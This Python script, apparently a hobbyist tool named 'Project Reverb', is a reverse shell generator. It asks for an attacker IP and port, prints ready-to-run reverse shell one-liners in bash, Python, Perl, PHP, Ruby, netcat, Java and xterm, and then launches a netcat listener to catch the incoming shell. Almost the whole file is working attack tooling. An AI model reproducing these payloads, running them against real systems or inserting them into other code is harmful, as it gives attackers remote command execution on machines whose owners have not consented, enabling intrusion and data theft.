#!/usr/bin/env python3
# coding=utf-8
# Project Reverb -- HackGodybj

import os
import re
import sys
import colorama
from colorama import Fore,Style
from time import sleep

regex_IP = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
regex_PORT = "^((6553[0-5])|(655[0-2][0-9])|(65[0-4][0-9]{2})|(6[0-4][0-9]{3})|([1-5][0-9]{4})|([0-5]{0,5})|([0-9]{1,4}))$"


if os.name == 'nt':
    os.system('cls')
else:
    os.system('clear')
banner = Fore.WHITE + " Project Reverb " + Fore.WHITE + " \n Reverse Shell Generator" + Fore.WHITE + "\n Created By HackGodybj" 
for i in banner:
    print(i,end='')
    sys.stdout.flush()
    sleep(0.03)

def listner():
    if os.name == 'nt':
        print(Fore.GREEN + '[+] Listner Started..!!\n')
        os.system(f'.\\binaries\\nc.exe -nlvp { port } -s { ip }')
    else:
        print('[+] Listner Started..!!\n')
        os.system(f'.//binaries//nc -nlvp { port } -s { ip }')

def bash():
    print(Fore.WHITE + "\n\nbash -i >& /dev/tcp/"+ip+"/"+port +" 0>&1\n")
    listner()
def python():
    print(Fore.WHITE + "\n\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'\n" %(ip,port))    
    listner()
def python3():
    print(Fore.WHITE + "\n\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'\n" %(ip,port))    
    listner()
def perl():
    print(Fore.WHITE + "\n\nperl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n" %(ip,port))
    listner()
def php():
    print(Fore.WHITE + "\n\nphp -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n" %(ip,port))
    listner()
def ruby():
    print(Fore.WHITE + "\nruby -rsocket -e'f=TCPSocket.open("+ip+","+port+").to_i;exec sprintf("+"/bin/sh -i+"+"<&%d >&%d 2>&%d,f,f,f"+")'\n")
    listner()
def netcat():
    print(Fore.WHITE + f"\n\nnc -e /bin/sh %s %s\n" %(ip,port))
    listner()
def java():
    print(Fore.WHITE + '''\n\nr = Runtime.getRuntime()
        p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
        p.waitFor()\n''' %(ip,port))
    listner()
def xterm():
    print(Fore.WHITE + "\n\nxterm -display %s:%s" %(ip,port))
    listner()

def main_menu():
    print(Fore.WHITE + "\nListening IP : "+ip + Fore.WHITE + "\nListening port: "+port  +"\n" )
    print(Fore.WHITE + "[1].BASH REVERSE SHELL")
    print(Fore.WHITE +    "[2].PYTHON REVERSE SHELL")
    print(Fore.WHITE +    "[3].PYTHON 3 REVERSE SHELL")
    print(Fore.WHITE +  "[4].PERL REVERSE SHELL")
    print(Fore.WHITE + "[5].PHP REVERSE SHELL")
    print(Fore.WHITE +    "[6].RUBY REVERSE SHELL")
    print(Fore.WHITE + "[7].NETCAT REVERSE SHELL")
    print(Fore.WHITE +  "[8].JAVA REVERSE SHELL")
    print(Fore.WHITE +    "[9].XTERM REVERSE SHELL")
    print(Fore.WHITE + "[10]Use a different PORT")
    print(Fore.WHITE + "[11]Use a different IP")
    print(Fore.WHITE +  "[12].Exit the program\n")
    choice = int(input(Fore.WHITE + "Enter YOUR CHOICE : "))
    print_shell(choice)
def print_shell(choice):
    if choice == 1:
        {
            bash()
        }
    elif(choice == 2):
        {
            python()
        }
    elif(choice == 3):
        {
            python3()
        }
    elif(choice == 4):
        {
            perl()
        }
    elif(choice == 5):
        {
            php()
        }
    elif(choice == 6):
        {
            ruby()
        }
    elif(choice == 7):
        {
            netcat()
        }
    elif(choice == 8):
        {
             java()
        }
    elif(choice == 9):
        {
            xterm()
        }
    elif(choice == 10):
        {
            change_port()
        }
    elif(choice == 11):
        {
            change_ip()
        }
    elif(choice == 12):
        {
            exit(0)
        }
    else:
        {
            print("\n- choose a valid option")
            
        }
def change_ip():
    global ip
    ip = input(Fore.WHITE + "New LHOST :  ")
    main_menu()

def change_port():
    global port
    port = input(Fore.WHITE + "New LPORT :  ")
    main_menu()

ip = input("\n\n- Listening IP (LHOST) : ")

if (re.search(regex_IP, ip)):
    port = input("- Listening Port (LPORT) : ")
    if (re.search(regex_PORT, port)):
        main_menu()
    else:
        print('Please enter a valid Port between 0-65535')
        exit(0)
else:
    print('Please enter a valid IP')
    exit(0)

main_menu()



    